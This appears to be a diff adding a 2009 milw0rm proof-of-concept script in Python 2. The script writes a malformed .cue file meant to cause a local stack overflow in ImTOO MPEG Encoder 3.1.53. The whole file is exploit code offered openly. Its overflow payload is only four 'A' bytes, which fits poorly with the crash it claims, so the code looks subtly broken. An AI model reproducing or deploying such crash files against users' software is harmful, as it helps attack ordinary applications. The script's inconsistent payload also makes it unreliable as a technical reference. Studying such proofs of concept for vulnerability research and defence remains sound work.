@@ -1,0 +1,11 @@
+#!/usr/bin/python
+print "ImTOO MPEG Encoder 3.1.53 (.cue/.m3u) local stack overlow POC"
+print " finded by : opt!x hacker <optix@9.cn> "
+print "download: http://www.soft32.com/download/63-300154-1/mpeg-encoder.exe "
+junk = "\x41"*4
+# file=open("crash.m3u","w")
+file=open("crash.cue","w")
+file.write(junk)
+file.close()
+
+# milw0rm.com [2009-08-06]
